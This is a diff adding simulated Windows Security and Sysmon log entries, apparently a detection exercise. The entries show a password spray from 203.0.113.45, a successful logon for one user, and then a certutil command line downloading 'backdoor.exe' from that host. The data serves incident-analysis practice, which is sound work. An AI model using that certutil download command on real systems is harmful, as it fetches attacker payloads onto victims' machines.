@@ -1,0 +1,148 @@
+{
+  "log_id": "LOG001",
+  "timestamp": "2026-03-27T11:00:05Z",
+  "source": "windows_security",
+  "EventID": 4625,
+  "user": "asmith",
+  "logon_type": 3,
+  "src_ip": "203.0.113.45",
+  "SubStatus": "0xC000006A"
+},
+
+{
+  "log_id": "LOG002",
+  "timestamp": "2026-03-27T11:02:10Z",
+  "source": "windows_security",
+  "EventID": 4625,
+  "user": "bjohnson",
+  "logon_type": 3,
+  "src_ip": "203.0.113.45",
+  "SubStatus": "0xC000006A"
+},
+
+{
+  "log_id": "LOG003",
+  "timestamp": "2026-03-27T11:05:22Z",
+  "source": "windows_security",
+  "EventID": 4625,
+  "user": "cdavis",
+  "logon_type": 3,
+  "src_ip": "203.0.113.45",
+  "SubStatus": "0xC000006A"
+},
+
+{
+  "log_id": "LOG004",
+  "timestamp": "2026-03-27T11:07:00Z",
+  "source": "windows_security",
+  "EventID": 4625,
+  "user": "dlee",
+  "logon_type": 3,
+  "src_ip": "203.0.113.45",
+  "SubStatus": "0xC000006A"
+},
+
+{
+  "log_id": "LOG005",
+  "timestamp": "2026-03-27T11:08:30Z",
+  "source": "windows_security",
+  "EventID": 4625,
+  "user": "finance.user",
+  "logon_type": 3,
+  "src_ip": "10.0.20.12",
+  "SubStatus": "0xC000006A"
+},
+
+{
+  "log_id": "LOG006",
+  "timestamp": "2026-03-27T11:10:45Z",
+  "source": "windows_security",
+  "EventID": 4625,
+  "user": "eroberts",
+  "logon_type": 3,
+  "src_ip": "203.0.113.45",
+  "SubStatus": "0xC000006A"
+},
+
+{
+  "log_id": "LOG007",
+  "timestamp": "2026-03-27T11:15:12Z",
+  "source": "windows_security",
+  "EventID": 4625,
+  "user": "fwhite",
+  "logon_type": 3,
+  "src_ip": "203.0.113.45",
+  "SubStatus": "0xC000006A"
+},
+
+{
+  "log_id": "LOG008",
+  "timestamp": "2026-03-27T11:20:00Z",
+  "source": "windows_security",
+  "EventID": 4624,
+  "user": "hr.user",
+  "logon_type": 2,
+  "src_ip": "10.0.25.10"
+},
+
+{
+  "log_id": "LOG009",
+  "timestamp": "2026-03-27T11:25:33Z",
+  "source": "windows_security",
+  "EventID": 4625,
+  "user": "gmartin",
+  "logon_type": 3,
+  "src_ip": "203.0.113.45",
+  "SubStatus": "0xC000006A"
+},
+
+{
+  "log_id": "LOG010",
+  "timestamp": "2026-03-27T11:30:10Z",
+  "source": "windows_security",
+  "EventID": 4625,
+  "user": "hclark",
+  "logon_type": 3,
+  "src_ip": "203.0.113.45",
+  "SubStatus": "0xC000006A"
+},
+
+{
+  "log_id": "LOG011",
+  "timestamp": "2026-03-27T12:00:00Z",
+  "source": "windows_security",
+  "EventID": 4624,
+  "user": "tflenderson",
+  "logon_type": 3,
+  "src_ip": "203.0.113.45"
+},
+
+{
+  "log_id": "LOG012",
+  "timestamp": "2026-03-27T12:01:10Z",
+  "source": "windows_security",
+  "EventID": 4624,
+  "user": "it.admin",
+  "logon_type": 10,
+  "src_ip": "10.0.30.5"
+},
+
+{
+  "log_id": "LOG013",
+  "timestamp": "2026-03-27T12:05:00Z",
+  "source": "sysmon",
+  "EventID": 1,
+  "Image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+  "CommandLine": "cmd.exe /c certutil.exe -urlcache -split -f <http://203.0.113.45/backdoor.exe> C:\\\\Temp\\\\backdoor.exe",
+  "User": "BANKLOCAL\\\\tflenderson"
+},
+
+{
+  "log_id": "LOG014",
+  "timestamp": "2026-03-27T12:06:30Z",
+  "source": "sysmon",
+  "EventID": 1,
+  "Image": "powershell.exe",
+  "CommandLine": "powershell Get-Process",
+  "User": "BANKLOCAL\\\\it.admin"
+}
